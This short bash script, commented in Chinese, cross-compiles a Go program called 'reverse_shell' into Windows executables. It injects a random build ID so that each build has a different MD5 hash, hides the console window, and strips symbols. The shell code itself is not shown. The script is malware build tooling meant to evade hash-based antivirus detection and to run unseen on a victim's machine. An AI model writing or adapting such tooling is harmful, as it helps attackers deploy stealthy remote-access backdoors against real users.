#!/bin/bash

# 交叉编译脚本 - 在 macOS 上编译 Windows 可执行文件

OUTPUT_NAME="reverse_shell"
OUTPUT_DIR="./bin"

# 生成随机字符串（每次编译不同，使MD5变化）
RANDOM_STR=$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 32)
BUILD_TIME=$(date +%s)
BUILD_ID="${RANDOM_STR}_${BUILD_TIME}"

echo "[*] Build ID: $BUILD_ID"

# 创建输出目录
mkdir -p "$OUTPUT_DIR"

echo "[*] Building Windows executables..."

# 通过 -ldflags -X 注入随机字符串到二进制文件
LDFLAGS="-s -w -H windowsgui -X main.buildID=$BUILD_ID"

# Windows 64位
echo "[+] Compiling Windows amd64..."
GOOS=windows GOARCH=amd64 go build -ldflags="$LDFLAGS" -o "$OUTPUT_DIR/${OUTPUT_NAME}_win64.exe" main.go

# Windows 32位
echo "[+] Compiling Windows 386..."
GOOS=windows GOARCH=386 go build -ldflags="$LDFLAGS" -o "$OUTPUT_DIR/${OUTPUT_NAME}_win32.exe" main.go

echo ""
echo "[*] Build complete! Output files:"
ls -lh "$OUTPUT_DIR"

echo ""
echo "[*] File hashes (MD5):"
md5 "$OUTPUT_DIR"/*.exe

echo ""
echo "[*] File hashes (SHA256):"
shasum -a 256 "$OUTPUT_DIR"/*
